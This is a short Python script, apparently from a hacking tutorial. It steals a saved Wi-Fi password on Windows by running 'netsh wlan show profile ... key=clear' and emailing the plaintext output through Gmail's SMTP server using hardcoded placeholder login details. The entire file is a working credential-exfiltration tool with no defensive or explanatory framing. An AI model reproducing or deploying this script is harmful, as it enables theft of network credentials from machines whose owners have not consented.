#!/usr/bin/env python
import subprocess, smtplib


def send_mail(email, password, message):
    # Creating SMTP server instance of gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # Initiate TLS server
    server.starttls()
    # Login to email
    server.login(email, password)
    # Send mail
    server.sendmail(email, email, message)
    # Stopping the server
    server.quit()


# Declaring of string command, sending all wireless keys
command = "netsh wlan show profile [NETWORK_NAME] key=clear"
# Execute the command using subprocess
result = subprocess.check_output(command, shell=True)
# Sending result by email
send_mail("example@gmail.com","password", result)
